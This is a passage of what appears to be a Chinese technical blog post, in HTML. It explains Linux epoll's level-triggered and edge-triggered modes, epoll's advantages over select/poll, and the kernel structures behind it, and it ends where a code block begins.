<p style="line-height:26px; font-family:微软雅黑; font-size:18px; margin-top:0px; margin-bottom:0px; white-space:normal; orphans:2; widows:2; background-color:rgb(255,255,255)"> <strong><span lang="EN-US" style="color:red; font-family:'Times New Roman',serif; background-color:rgb(217,217,217)">Epoll</span><span style="color:red; font-family:黑体; background-color:rgb(217,217,217)">的</span><span lang="EN-US" style="color:red; font-family:'Times New Roman',serif; background-color:rgb(217,217,217)">2</span><span style="color:red; font-family:黑体; background-color:rgb(217,217,217)">种工作方式</span><span lang="EN-US" style="color:red; font-family:'Times New Roman',serif; background-color:rgb(217,217,217)">-</span><span style="color:red; font-family:黑体; background-color:rgb(217,217,217)">水平触发（</span><span lang="EN-US" style="color:red; font-family:'Times New Roman',serif; background-color:rgb(217,217,217)">LT</span><span style="color:red; font-family:黑体; background-color:rgb(217,217,217)">）和边缘触发（</span><span lang="EN-US" style="color:red; font-family:'Times New Roman',serif; background-color:rgb(217,217,217)">ET</span><span style="color:red; font-family:黑体; background-color:rgb(217,217,217)">）</span><span lang="EN-US" style="color:red; font-family:'Times New Roman',serif; background-color:rgb(217,217,217)"></span></strong> </p> 
<p style="line-height:26px; font-family:微软雅黑; font-size:18px; margin-top:0px; margin-bottom:0px; white-space:normal; orphans:2; widows:2; background-color:rgb(255,255,255)"> <span lang="EN-US"><span style="font-family:'Times New Roman',serif"></span></span></p> 
<p style="line-height:26px; font-family:Arial; font-size:18px; margin-top:0px; margin-bottom:0px; white-space:normal; orphans:2; widows:2; background-color:rgb(255,255,255)"> <span style="font-family:'Times New Roman'">假如有这样一个例子：</span> </p> 
<p style="line-height:26px; font-family:Arial; font-size:18px; margin-top:0px; margin-bottom:0px; white-space:normal; orphans:2; widows:2; background-color:rgb(255,255,255)"> <span style="font-family:'Times New Roman'">1. 我们已经把一个用来从管道中读取数据的文件句柄(RFD)添加到epoll描述符</span> </p> 
<p style="line-height:26px; font-family:Arial; font-size:18px; margin-top:0px; margin-bottom:0px; white-space:normal; orphans:2; widows:2; background-color:rgb(255,255,255)"> <span style="font-family:'Times New Roman'">2. 这个时候从管道的另一端被写入了2KB的数据</span> </p> 
<p style="line-height:26px; font-family:Arial; font-size:18px; margin-top:0px; margin-bottom:0px; white-space:normal; orphans:2; widows:2; background-color:rgb(255,255,255)"> <span style="font-family:'Times New Roman'">3. 调用epoll_wait(2)，并且它会返回RFD，说明它已经准备好读取操作</span> </p> 
<p style="line-height:26px; font-family:Arial; font-size:18px; margin-top:0px; margin-bottom:0px; white-space:normal; orphans:2; widows:2; background-color:rgb(255,255,255)"> <span style="font-family:'Times New Roman'">4. 然后我们读取了1KB的数据</span> </p> 
<p style="line-height:26px; font-family:Arial; font-size:18px; margin-top:0px; margin-bottom:0px; white-space:normal; orphans:2; widows:2; background-color:rgb(255,255,255)"> <span style="font-family:'Times New Roman'">5. 调用epoll_wait(2)......</span> </p> 
<p style="line-height:26px; font-family:微软雅黑; font-size:18px; margin-top:0px; margin-bottom:0px; white-space:normal; orphans:2; widows:2; background-color:rgb(255,255,255)"> <span style="font-family:'Times New Roman',serif"><br> </span></p> 
<p style="line-height:26px; font-family:Arial; font-size:18px; margin-top:0px; margin-bottom:0px; white-space:normal; orphans:2; widows:2; background-color:rgb(255,255,255)"> <span style="color:rgb(255,0,0)"><span style="font-family:'Times New Roman'">Edge Triggered 工作模式：</span></span> </p> 
<p style="line-height:26px; font-family:Arial; font-size:18px; margin-top:0px; margin-bottom:0px; white-space:normal; orphans:2; widows:2; background-color:rgb(255,255,255)"> <span style="font-family:'Times New Roman'">如果我们在第1步将RFD添加到epoll描述符的时候使用了EPOLLET标志，那么在第5步调用epoll_wait(2)之后将有可能会挂起，因为剩余的数据还存在于文件的输入缓冲区内，而且数据发出端还在等待一个针对已经发出数据的反馈信息。只有在监视的文件句柄上发生了某个事件的时候 ET 工作模式才会汇报事件。因此在第5步的时候，调用者可能会放弃等待仍在存在于文件输入缓冲区内的剩余数据。在上面的例子中，会有一个事件产生在RFD句柄上，因为在第2步执行了一个写操作，然后，事件将会在第3步被销毁。因为第4步的读取操作没有读空文件输入缓冲区内的数据，因此我们在第5步调用 epoll_wait(2)完成后，是否挂起是不确定的。epoll工作在ET模式的时候，必须使用非阻塞套接口，以避免由于一个文件句柄的阻塞读/阻塞写操作把处理多个文件描述符的任务饿死。最好以下面的方式调用ET模式的epoll接口，在后面会介绍避免可能的缺陷。</span> </p> 
<p style="line-height:26px; font-family:Arial; font-size:18px; margin-top:0px; margin-bottom:0px; white-space:normal; orphans:2; widows:2; background-color:rgb(255,255,255)"> <span style="font-family:'Times New Roman'">   i    基于非阻塞文件句柄</span> </p> 
<p style="line-height:26px; font-family:Arial; font-size:18px; margin-top:0px; margin-bottom:0px; white-space:normal; orphans:2; widows:2; background-color:rgb(255,255,255)"> <span style="font-family:'Times New Roman'">   ii   只有当read(2)或者write(2)返回EAGAIN时才需要挂起，等待。但这并不是说每次read()时都需要循环读，直到读到产生一个EAGAIN才认为此次事件处理完成，当read()返回的读到的数据长度小于请求的数据长度时，就可以确定此时缓冲中已没有数据了，也就可以认为此事读事件已处理完成。</span> </p> 
<p style="line-height:26px; font-family:Arial; font-size:18px; margin-top:0px; margin-bottom:0px; white-space:normal; orphans:2; widows:2; background-color:rgb(255,255,255)"> <span style="font-family:'Times New Roman'"><br> </span></p> 
<p style="line-height:26px; font-family:Arial; font-size:18px; margin-top:0px; margin-bottom:0px; white-space:normal; orphans:2; widows:2; background-color:rgb(255,255,255)"> <span style="color:rgb(255,0,0)"><span style="font-family:'Times New Roman'">Level Triggered 工作模式</span></span> </p> 
<p style="line-height:26px; font-family:Arial; font-size:18px; margin-top:0px; margin-bottom:0px; white-space:normal; orphans:2; widows:2; background-color:rgb(255,255,255)"> <span style="font-family:'Times New Roman'">相反的，以LT方式调用epoll接口的时候，它就相当于一个速度比较快的poll(2)，并且无论后面的数据是否被使用，因此他们具有同样的职能。因为即使使用ET模式的epoll，在收到多个chunk的数据的时候仍然会产生多个事件。调用者可以设定EPOLLONESHOT标志，在 epoll_wait(2)收到事件后epoll会与事件关联的文件句柄从epoll描述符中禁止掉。因此当EPOLLONESHOT设定后，使用带有 EPOLL_CTL_MOD标志的epoll_ctl(2)处理文件句柄就成为调用者必须作的事情。</span> </p> 
<p style="line-height:26px; font-family:Arial; font-size:18px; margin-top:0px; margin-bottom:0px; white-space:normal; orphans:2; widows:2; background-color:rgb(255,255,255)"> <br> </p> 
<p style="line-height:26px; font-family:Arial; font-size:18px; margin-top:0px; margin-bottom:0px; white-space:normal; orphans:2; widows:2; background-color:rgb(255,255,255)"> <span style="color:rgb(255,0,0)"><span lang="EN-US"><span style="font-family:'Times New Roman'"><br> </span></span></span></p> 
<p style="line-height:26px; font-family:Arial; font-size:18px; margin-top:0px; margin-bottom:0px; white-space:normal; orphans:2; widows:2; background-color:rgb(255,255,255)"> <span style="font-family:'Times New Roman'"><span style="color:rgb(255,0,0)"><span lang="EN-US">LT(level triggered)</span>是epoll<span style="background-color:silver"><strong>缺省的工作方式</strong></span>，并且同时支持<span lang="EN-US">block</span>和<span lang="EN-US">no-block socket.</span></span>在这种做法中，内核告诉你一个文件描述符是否就绪了，然后你可以对这个就绪的<span lang="EN-US">fd</span>进行<span lang="EN-US">IO</span>操作。如果你不作任何操作，内核还是会继续通知你 的，所以，这种模式编程出错误可能性要小一点。传统的<span lang="EN-US">select/poll</span>都是这种模型的代表．<span lang="EN-US"></span></span> </p> 
<p style="line-height:26px; font-family:Arial; font-size:18px; margin-top:0px; margin-bottom:0px; white-space:normal; orphans:2; widows:2; background-color:rgb(255,255,255)"> <span lang="EN-US"><span style="font-family:'Times New Roman'"> </span></span> </p> 
<p style="line-height:26px; font-family:Arial; font-size:18px; margin-top:0px; margin-bottom:0px; white-space:normal; orphans:2; widows:2; background-color:rgb(255,255,255)"> <span style="font-family:'Times New Roman'"><span style="color:rgb(255,0,0)"><span lang="EN-US">ET (edge-triggered)</span>是高速工作方式，只支持<span lang="EN-US">no-block socket，它效率要比LT更高</span></span><span style="color:rgb(255,0,0)">。ET与LT的区别在于，</span>当一个新的事件到来时，ET模式下当然可以从epoll_wait调用中获取到这个事件，可是如果这次没有把这个事件对应的套接字缓冲区处理完，在这个套接字中没有新的事件再次到来时，在ET模式下是无法再次从epoll_wait调用中获取这个事件的。而LT模式正好相反，只要一个事件对应的套接字缓冲区还有数据，就总能从epoll_wait中获取这个事件。</span> </p> 
<p style="line-height:26px; font-family:Arial; font-size:18px; margin-top:0px; margin-bottom:0px; white-space:normal; orphans:2; widows:2; background-color:rgb(255,255,255)"> <span style="font-family:'Times New Roman'">因此，LT模式下开发基于epoll的应用要简单些，不太容易出错。而在ET模式下事件发生时，如果没有彻底地将缓冲区数据处理完，则会导致缓冲区中的用户请求得不到响应。</span> </p> 
<p style="line-height:26px; font-family:Arial; font-size:18px; margin-top:0px; margin-bottom:0px; white-space:normal; orphans:2; widows:2; background-color:rgb(255,255,255)"> <br> </p> 
<p style="line-height:26px; font-family:Arial; font-size:18px; margin-top:0px; margin-bottom:0px; white-space:normal; orphans:2; widows:2; background-color:rgb(255,255,255)"> <span style="color:rgb(255,0,0)"><span style="font-family:'Times New Roman'">Nginx默认采用ET模式来使用epoll。</span></span> </p> 
<p style="line-height:26px; font-family:微软雅黑; font-size:18px; margin-top:0px; margin-bottom:0px; white-space:normal; orphans:2; widows:2; background-color:rgb(255,255,255)"> <span lang="EN-US" style="font-family:'Times New Roman',serif"> </span> </p> 
<h3 style="margin:0px; padding:0px; line-height:26px; font-family:Arial; white-space:normal; background-color:rgb(255,255,255)"> <strong><span style="font-family:SimHei; font-size:24px"><span lang="EN-US" style="color:red; background-color:rgb(217,217,217)">epoll</span><span style="color:red; background-color:rgb(217,217,217)">的优点：</span></span></strong> </h3> 
<p style="line-height:26px; font-family:微软雅黑; font-size:18px; margin-top:0px; margin-bottom:0px; white-space:normal; orphans:2; widows:2; background-color:rgb(255,255,255)"> <strong><span lang="EN-US" style="color:red; font-family:'Times New Roman',serif">1.</span><span style="color:red; font-family:宋体">支持一个进程打开大数目的</span><span lang="EN-US" style="color:red; font-family:'Times New Roman',serif">socket</span><span style="color:red; font-family:宋体">描述符</span><span lang="EN-US" style="color:red; font-family:'Times New Roman',serif">(FD)</span></strong> </p> 
<p style="line-height:26px; font-family:微软雅黑; font-size:18px; margin-top:0px; margin-bottom:0px; white-space:normal; orphans:2; widows:2; background-color:rgb(255,255,255)"> <span lang="EN-US" style="font-family:'Times New Roman',serif">    select </span><span style="font-family:宋体">最不能忍受的是一个进程所打开的</span><span lang="EN-US" style="font-family:'Times New Roman',serif">FD</span><span style="font-family:宋体">是有一定限制的，由</span><span lang="EN-US" style="font-family:'Times New Roman',serif">FD_SETSIZE</span><span style="font-family:宋体">设置，默认值是</span><span lang="EN-US" style="font-family:'Times New Roman',serif">2048</span><span style="font-family:宋体">。对于那些需要支持的上万连接数目的</span><span lang="EN-US" style="font-family:'Times New Roman',serif">IM</span><span style="font-family:宋体">服务器来说显然太少了。这时候你一是可以选择修改这个宏然后重新编译内核，不过资料也同时指出这样会带来网络效率的下降，二是可以选择多进程的解决方案</span><span lang="EN-US" style="font-family:'Times New Roman',serif">(</span><span style="font-family:宋体">传统的</span><span lang="EN-US" style="font-family:'Times New Roman',serif"> Apache</span><span style="font-family:宋体">方案</span><span lang="EN-US" style="font-family:'Times New Roman',serif">)</span><span style="font-family:宋体">，不过虽然</span><span lang="EN-US" style="font-family:'Times New Roman',serif">linux</span><span style="font-family:宋体">上面创建进程的代价比较小，但仍旧是不可忽视的，加上进程间数据同步远比不上线程间同步的高效，所以也不是一种完美的方案。不过</span><span style="font-family:'Times New Roman',serif"> <span lang="EN-US" style="color:red">epoll</span></span><span style="color:red; font-family:宋体">则没有这个限制，它所支持的</span><span lang="EN-US" style="color:red; font-family:'Times New Roman',serif">FD</span><span style="color:red; font-family:宋体">上限是最大可以打开文件的数目</span><span style="font-family:宋体">，这个数字一般远大于</span><span lang="EN-US" style="font-family:'Times New Roman',serif">2048,</span><span style="font-family:宋体">举个例子</span><span lang="EN-US" style="font-family:'Times New Roman',serif">,</span><span style="font-family:宋体">在</span><span lang="EN-US" style="font-family:'Times New Roman',serif">1GB</span><span style="font-family:宋体">内存的机器上大约是</span><span lang="EN-US" style="font-family:'Times New Roman',serif">10</span><span style="font-family:宋体">万左右，具体数目可以</span><span lang="EN-US" style="font-family:'Times New Roman',serif">cat /proc/sys/fs/file-max</span><span style="font-family:宋体">察看</span><span lang="EN-US" style="font-family:'Times New Roman',serif">,</span><span style="font-family:宋体">一般来说这个数目和系统内存关系很大。</span><span lang="EN-US" style="font-family:'Times New Roman',serif"></span> </p> 
<p style="line-height:26px; font-family:微软雅黑; font-size:18px; margin-top:0px; margin-bottom:0px; white-space:normal; orphans:2; widows:2; background-color:rgb(255,255,255)"> <span lang="EN-US" style="font-family:'Times New Roman',serif"> </span> </p> 
<p style="line-height:26px; font-family:微软雅黑; font-size:18px; margin-top:0px; margin-bottom:0px; white-space:normal; orphans:2; widows:2; background-color:rgb(255,255,255)"> <strong><span lang="EN-US" style="color:red; font-family:'Times New Roman',serif">2.IO</span><span style="color:red; font-family:宋体">效率不随</span><span lang="EN-US" style="color:red; font-family:'Times New Roman',serif">FD</span><span style="color:red; font-family:宋体">数目增加而线性下降</span><span lang="EN-US" style="color:red; font-family:'Times New Roman',serif"></span></strong> </p> 
<p style="line-height:26px; font-family:微软雅黑; font-size:18px; margin-top:0px; margin-bottom:0px; white-space:normal; orphans:2; widows:2; background-color:rgb(255,255,255)"> <span lang="EN-US" style="font-family:'Times New Roman',serif">    </span><span style="font-family:宋体">传统的</span><span lang="EN-US" style="font-family:'Times New Roman',serif">select/poll</span><span style="font-family:宋体">另一个致命弱点就是当你拥有一个很大的</span><span lang="EN-US" style="font-family:'Times New Roman',serif">socket</span><span style="font-family:宋体">集合，不过由于网络延时，任一时间只有部分的</span><span lang="EN-US" style="font-family:'Times New Roman',serif">socket</span><span style="font-family:宋体">是</span><span lang="EN-US" style="font-family:'Times New Roman',serif">"</span><span style="font-family:宋体">活跃</span><span lang="EN-US" style="font-family:'Times New Roman',serif">"</span><span style="font-family:宋体">的，但是</span><span lang="EN-US" style="font-family:'Times New Roman',serif">select/poll</span><span style="font-family:宋体">每次调用都会线性扫描全部的集合，导致效率呈现线性下降。但是</span><span lang="EN-US" style="font-family:'Times New Roman',serif">epoll</span><span style="font-family:宋体">不存在这个问题，它<span style="color:red">只会对</span></span><span lang="EN-US" style="color:red; font-family:'Times New Roman',serif">"</span><span style="color:red; font-family:宋体">活跃</span><span lang="EN-US" style="color:red; font-family:'Times New Roman',serif">"</span><span style="color:red; font-family:宋体">的</span><span lang="EN-US" style="color:red; font-family:'Times New Roman',serif">socket</span><span style="color:red; font-family:宋体">进行操作</span><span lang="EN-US" style="font-family:'Times New Roman',serif">---</span><span style="font-family:宋体">这是因为在内核实现中</span><span lang="EN-US" style="font-family:'Times New Roman',serif">epoll</span><span style="font-family:宋体">是根据每个</span><span lang="EN-US" style="font-family:'Times New Roman',serif">fd</span><span style="font-family:宋体">上面的</span><span lang="EN-US" style="font-family:'Times New Roman',serif">callback</span><span style="font-family:宋体">函数实现的。那么，只有</span><span lang="EN-US" style="font-family:'Times New Roman',serif">"</span><span style="font-family:宋体">活跃</span><span lang="EN-US" style="font-family:'Times New Roman',serif">"</span><span style="font-family:宋体">的</span><span lang="EN-US" style="font-family:'Times New Roman',serif">socket</span><span style="font-family:宋体">才会主动的去调用</span><span lang="EN-US" style="font-family:'Times New Roman',serif"> callback</span><span style="font-family:宋体">函数，其他</span><span lang="EN-US" style="font-family:'Times New Roman',serif">idle</span><span style="font-family:宋体">状态</span><span lang="EN-US" style="font-family:'Times New Roman',serif">socket</span><span style="font-family:宋体">则不会，在这点上，</span><span lang="EN-US" style="color:red; font-family:'Times New Roman',serif">epoll</span><span style="color:red; font-family:宋体">实现了一个</span><span lang="EN-US" style="color:red; font-family:'Times New Roman',serif">"</span><span style="color:red; font-family:宋体">伪</span><span lang="EN-US" style="color:red; font-family:'Times New Roman',serif">"AIO</span><span style="color:red; font-family:宋体">，</span><span style="font-family:宋体">因为这时候推动力在</span><span lang="EN-US" style="font-family:'Times New Roman',serif">os</span><span style="font-family:宋体">内核。在一些</span><span lang="EN-US" style="font-family:'Times New Roman',serif"> benchmark</span><span style="font-family:宋体">中，如果所有的</span><span lang="EN-US" style="font-family:'Times New Roman',serif">socket</span><span style="font-family:宋体">基本上都是活跃的</span><span lang="EN-US" style="font-family:'Times New Roman',serif">---</span><span style="font-family:宋体">比如一个高速</span><span lang="EN-US" style="font-family:'Times New Roman',serif">LAN</span><span style="font-family:宋体">环境，</span><span lang="EN-US" style="font-family:'Times New Roman',serif">epoll</span><span style="font-family:宋体">并不比</span><span lang="EN-US" style="font-family:'Times New Roman',serif">select/poll</span><span style="font-family:宋体">有什么效率，相反，如果过多使用</span><span lang="EN-US" style="font-family:'Times New Roman',serif">epoll_ctl,</span><span style="font-family:宋体">效率相比还有稍微的下降。但是一旦使用</span><span lang="EN-US" style="font-family:'Times New Roman',serif">idle connections</span><span style="font-family:宋体">模拟</span><span lang="EN-US" style="font-family:'Times New Roman',serif">WAN</span><span style="font-family:宋体">环境</span><span lang="EN-US" style="font-family:'Times New Roman',serif">,epoll</span><span style="font-family:宋体">的效率就远在</span><span lang="EN-US" style="font-family:'Times New Roman',serif">select/poll</span><span style="font-family:宋体">之上了。</span><span lang="EN-US" style="font-family:'Times New Roman',serif"></span> </p> 
<p style="line-height:26px; font-family:微软雅黑; font-size:18px; margin-top:0px; margin-bottom:0px; white-space:normal; orphans:2; widows:2; background-color:rgb(255,255,255)"> <span lang="EN-US" style="font-family:'Times New Roman',serif"> </span> </p> 
<p style="line-height:26px; font-family:微软雅黑; font-size:18px; margin-top:0px; margin-bottom:0px; white-space:normal; orphans:2; widows:2; background-color:rgb(255,255,255)"> <strong><span lang="EN-US" style="color:red; font-family:'Times New Roman',serif">3.</span><span style="color:red; font-family:宋体">使用</span><span lang="EN-US" style="color:red; font-family:'Times New Roman',serif">mmap</span><span style="color:red; font-family:宋体">加速内核与用户空间的消息传递</span></strong> </p> 
<p style="line-height:26px; font-family:微软雅黑; font-size:18px; margin-top:0px; margin-bottom:0px; white-space:normal; orphans:2; widows:2; background-color:rgb(255,255,255)"> <span lang="EN-US" style="font-family:'Times New Roman',serif">    </span><span style="font-family:宋体">这点实际上涉及到</span><span lang="EN-US" style="font-family:'Times New Roman',serif">epoll</span><span style="font-family:宋体">的具体实现了。无论是</span><span lang="EN-US" style="font-family:'Times New Roman',serif">select,poll</span><span style="font-family:宋体">还是</span><span lang="EN-US" style="font-family:'Times New Roman',serif">epoll</span><span style="color:red; font-family:宋体">都需要内核把</span><span lang="EN-US" style="color:red; font-family:'Times New Roman',serif">FD</span><span style="color:red; font-family:宋体">消息通知给用户空间</span><span style="font-family:宋体">，如何避免不必要的内存拷贝就很重要，在这点上，</span><span lang="EN-US" style="font-family:'Times New Roman',serif">epoll</span><span style="font-family:宋体">是通过内核于用户空间</span><span lang="EN-US" style="font-family:'Times New Roman',serif">mmap</span><span style="font-family:宋体">同一块内存实现的。而如果你想我一样从</span><span lang="EN-US" style="font-family:'Times New Roman',serif">2.5</span><span style="font-family:宋体">内核就关注</span><span lang="EN-US" style="font-family:'Times New Roman',serif">epoll</span><span style="font-family:宋体">的话，一定不会忘记手工</span><span lang="EN-US" style="font-family:'Times New Roman',serif"> mmap</span><span style="font-family:宋体">这一步的。</span><span lang="EN-US" style="font-family:'Times New Roman',serif"></span> </p> 
<p style="line-height:26px; font-family:微软雅黑; font-size:18px; margin-top:0px; margin-bottom:0px; white-space:normal; orphans:2; widows:2; background-color:rgb(255,255,255)"> <span lang="EN-US" style="font-family:'Times New Roman',serif"> </span> </p> 
<p style="line-height:26px; font-family:微软雅黑; font-size:18px; margin-top:0px; margin-bottom:0px; white-space:normal; orphans:2; widows:2; background-color:rgb(255,255,255)"> <strong><span lang="EN-US" style="color:red; font-family:'Times New Roman',serif">4.</span><span style="color:red; font-family:宋体">内核微调</span><span lang="EN-US" style="color:red; font-family:'Times New Roman',serif"></span></strong> </p> 
<p style="line-height:26px; font-family:微软雅黑; font-size:18px; margin-top:0px; margin-bottom:0px; white-space:normal; orphans:2; widows:2; background-color:rgb(255,255,255)"> <span style="font-family:宋体">这一点其实不算</span><span lang="EN-US" style="font-family:'Times New Roman',serif">epoll</span><span style="font-family:宋体">的优点了，而是整个</span><span lang="EN-US" style="font-family:'Times New Roman',serif">linux</span><span style="font-family:宋体">平台的优点。也许你可以怀疑</span><span lang="EN-US" style="font-family:'Times New Roman',serif">linux</span><span style="font-family:宋体">平台，但是你无法回避</span><span lang="EN-US" style="font-family:'Times New Roman',serif">linux</span><span style="font-family:宋体">平台赋予你微调内核的能力。比如，内核</span><span lang="EN-US" style="font-family:'Times New Roman',serif">TCP/IP</span><span style="font-family:宋体">协议栈使用内存池管理</span><span lang="EN-US" style="font-family:'Times New Roman',serif">sk_buff</span><span style="font-family:宋体">结构，那么可以在运行时期动态调整这个内存</span><span lang="EN-US" style="font-family:'Times New Roman',serif">pool(skb_head_pool)</span><span style="font-family:宋体">的大小</span><span lang="EN-US" style="font-family:'Times New Roman',serif">--- </span><span style="font-family:宋体">通过</span><span lang="EN-US" style="font-family:'Times New Roman',serif">echo XXXX&gt;/proc/sys/net/core/hot_list_length</span><span style="font-family:宋体">完成。再比如</span><span lang="EN-US" style="font-family:'Times New Roman',serif">listen</span><span style="font-family:宋体">函数的第</span><span lang="EN-US" style="font-family:'Times New Roman',serif">2</span><span style="font-family:宋体">个参数</span><span lang="EN-US" style="font-family:'Times New Roman',serif">(TCP</span><span style="font-family:宋体">完成</span><span lang="EN-US" style="font-family:'Times New Roman',serif">3</span><span style="font-family:宋体">次握手的数据包队列长度</span><span lang="EN-US" style="font-family:'Times New Roman',serif">)</span><span style="font-family:宋体">，也可以根据你平台内存大小动态调整。更甚至在一个数据包面数目巨大但同时每个数据包本身大小却很小的特殊系统上尝试最新的</span><span lang="EN-US" style="font-family:'Times New Roman',serif">NAPI</span><span style="font-family:宋体">网卡驱动架构。</span><span lang="EN-US" style="font-family:'Times New Roman',serif"></span> </p> 
<p style="line-height:26px; font-family:微软雅黑; font-size:18px; margin-top:0px; margin-bottom:0px; white-space:normal; orphans:2; widows:2; background-color:rgb(255,255,255)"> <span lang="EN-US" style="font-family:'Times New Roman',serif"> </span> </p> 
<h3 style="margin:0px; padding:0px; line-height:26px; font-family:Arial; white-space:normal; background-color:rgb(255,255,255)"> <strong><span style="font-family:SimHei; font-size:24px"><span lang="EN-US" style="color:red; background-color:rgb(217,217,217)">linux</span><span style="color:red; background-color:rgb(217,217,217)">下</span><span lang="EN-US" style="color:red; background-color:rgb(217,217,217)">epoll</span><span style="color:red; background-color:rgb(217,217,217)">如何实现高效处理百万句柄的</span></span></strong> </h3> 
<p style="line-height:26px; font-family:Arial; font-size:18px; margin-top:0px; margin-bottom:0px; white-space:normal; orphans:2; widows:2; background-color:rgb(255,255,255)"> <span style="font-family:'Times New Roman'">开发高性能网络程序时，<span lang="EN-US">windows</span>开发者们言必称<span lang="EN-US">iocp</span>，<span lang="EN-US">linux</span>开发者们则言必称<span lang="EN-US">epoll</span>。大家都明白<span lang="EN-US">epoll</span>是一种<span lang="EN-US">IO</span>多路复用技术，可以非常高效的处理数以百万计的<span lang="EN-US">socket</span>句柄，比起以前的<span lang="EN-US">select</span>和<span lang="EN-US">poll</span>效率高大发了。我们用起<span lang="EN-US">epoll</span>来都感觉挺爽，确实快，那么，它到底为什么可以高速处理这么多并发连接呢？<span lang="EN-US"></span></span> </p> 
<p style="line-height:26px; font-family:Arial; font-size:18px; margin-top:0px; margin-bottom:0px; white-space:normal; orphans:2; widows:2; background-color:rgb(255,255,255)"> <span lang="EN-US"><span style="font-family:'Times New Roman'"> </span></span> </p> 
<p style="line-height:26px; font-family:Arial; font-size:18px; margin-top:0px; margin-bottom:0px; white-space:normal; orphans:2; widows:2; background-color:rgb(255,255,255)"> <span style="font-family:'Times New Roman'">使用起来很清晰，首先要调用<span lang="EN-US">epoll_create</span>建立一个<span lang="EN-US">epoll</span>对象。参数<span lang="EN-US">size</span>是内核保证能够正确处理的最大句柄数，多于这个最大数时内核可不保证效果。<span lang="EN-US"></span></span> </p> 
<p style="line-height:26px; font-family:Arial; font-size:18px; margin-top:0px; margin-bottom:0px; white-space:normal; orphans:2; widows:2; background-color:rgb(255,255,255)"> <span lang="EN-US"><span style="font-family:'Times New Roman'"> </span></span> </p> 
<p style="line-height:26px; font-family:Arial; font-size:18px; margin-top:0px; margin-bottom:0px; white-space:normal; orphans:2; widows:2; background-color:rgb(255,255,255)"> <span style="font-family:'Times New Roman'"><span lang="EN-US">epoll_ctl</span>可以操作上面建立的<span lang="EN-US">epoll</span>，例如，将刚建立的<span lang="EN-US">socket</span>加入到<span lang="EN-US">epoll</span>中让其监控，或者把<span lang="EN-US"> epoll</span>正在监控的某个<span lang="EN-US">socket</span>句柄移出<span lang="EN-US">epoll</span>，不再监控它等等。<span lang="EN-US"></span></span> </p> 
<p style="line-height:26px; font-family:Arial; font-size:18px; margin-top:0px; margin-bottom:0px; white-space:normal; orphans:2; widows:2; background-color:rgb(255,255,255)"> <span lang="EN-US"><span style="font-family:'Times New Roman'"> </span></span> </p> 
<p style="line-height:26px; font-family:Arial; font-size:18px; margin-top:0px; margin-bottom:0px; white-space:normal; orphans:2; widows:2; background-color:rgb(255,255,255)"> <span style="font-family:'Times New Roman'"><span lang="EN-US">epoll_wait</span>在调用时，在给定的<span lang="EN-US">timeout</span>时间内，当在监控的所有句柄中有事件发生时，就返回用户态的进程。<span lang="EN-US"></span></span> </p> 
<p style="line-height:26px; font-family:Arial; font-size:18px; margin-top:0px; margin-bottom:0px; white-space:normal; orphans:2; widows:2; background-color:rgb(255,255,255)"> <span lang="EN-US"><span style="font-family:'Times New Roman'"> </span></span> </p> 
<p style="line-height:26px; font-family:Arial; font-size:18px; margin-top:0px; margin-bottom:0px; white-space:normal; orphans:2; widows:2; background-color:rgb(255,255,255)"> <span style="font-family:'Times New Roman'">从上面的调用方式就可以看到<span lang="EN-US">epoll</span>比<span lang="EN-US">select/poll</span>的优越之处：<span style="color:red">因为后者每次调用时都要传递你所要监控的所有</span><span lang="EN-US" style="color:red">socket</span><span style="color:red">给</span><span lang="EN-US" style="color:red">select/poll</span><span style="color:red">系统调用，这意味着需要将用户态的</span><span lang="EN-US" style="color:red">socket</span><span style="color:red">列表</span><span lang="EN-US" style="color:red">copy</span><span style="color:red">到内核态，</span>如果以万计的句柄会导致每次都要<span lang="EN-US">copy</span>几十几百<span lang="EN-US">KB</span>的内存到内核态，非常低效。而我们调用<span lang="EN-US">epoll_wait</span>时就相当于以往调用<span lang="EN-US">select/poll</span>，但是<span style="color:red">这时却不用传递</span><span lang="EN-US" style="color:red">socket</span><span style="color:red">句柄给内核，因为内核已经在</span><span lang="EN-US" style="color:red">epoll_ctl</span><span style="color:red">中拿到了要监控的句柄列表。</span><span lang="EN-US"></span></span> </p> 
<p style="line-height:26px; font-family:Arial; font-size:18px; margin-top:0px; margin-bottom:0px; white-space:normal; orphans:2; widows:2; background-color:rgb(255,255,255)"> <span lang="EN-US"><span style="font-family:'Times New Roman'"> </span></span> </p> 
<p style="line-height:26px; font-family:Arial; font-size:18px; margin-top:0px; margin-bottom:0px; white-space:normal; orphans:2; widows:2; background-color:rgb(255,255,255)"> <span style="font-family:'Times New Roman'">所以，实际上在你调用<span lang="EN-US">epoll_create</span>后，内核就已经在内核态开始准备帮你存储要监控的句柄了，每次调用<span lang="EN-US">epoll_ctl</span>只是在往内核的数据结构里塞入新的<span lang="EN-US">socket</span>句柄。<span lang="EN-US"></span></span> </p> 
<p style="line-height:26px; font-family:Arial; font-size:18px; margin-top:0px; margin-bottom:0px; white-space:normal; orphans:2; widows:2; background-color:rgb(255,255,255)"> <span lang="EN-US"><span style="font-family:'Times New Roman'"> 当一个进程调用epoll_creaqte方法时，Linux内核会创建一个eventpoll结构体，这个结构体中有两个成员与epoll的使用方式密切相关：</span></span> </p> 
<div class="dp-highlighter bg_cpp" style="margin:18px 0px!important; width:1044.43px; line-height:26px; overflow:auto; padding-top:1px; font-family:Consolas,'Courier New',Courier,mono,serif; white-space:normal; background-color:rgb(231,229,220)"> 
 <div class="bar" style="padding-left:45px"> 
  <div class="tools" style="padding:3px 8px 10px 10px; color:silver; line-height:normal; font-family:Verdana,Geneva,Arial,Helvetica,sans-serif; font-size:9px; border-left-color:rgb(153,153,153); border-left-width:3px; border-left-style:solid; background-color:rgb(248,248,248)"> 
   <strong>[cpp]</strong>  
   <a target="_blank" title="view plain" class="ViewSource" href="http://blog.csdn.net/xiajun07061225/article/details/9250579#" style="margin:0px 10px 0px 0px; padding:0px; border:currentColor; color:rgb(160,160,160); font-size:9px; text-decoration:none; background-color:inherit" rel="noopener noreferrer">view plain</a> 
   <a target="_blank" title="copy" class="CopyToClipboard" href="http://blog.csdn.net/xiajun07061225/article/details/9250579#" style="margin:0px 10px 0px 0px; padding:0px; border:currentColor; color:rgb(160,160,160); font-size:9px; text-decoration:none; background-color:inherit" rel="noopener noreferrer">copy</a> 
   <a target="_blank" title="print" class="PrintSource" href="http://blog.csdn.net/xiajun07061225/article/details/9250579#" style="margin:0px 10px 0px 0px; padding:0px; border:currentColor; color:rgb(160,160,160); font-size:9px; text-decoration:none; background-color:inherit" rel="noopener noreferrer">print</a> 
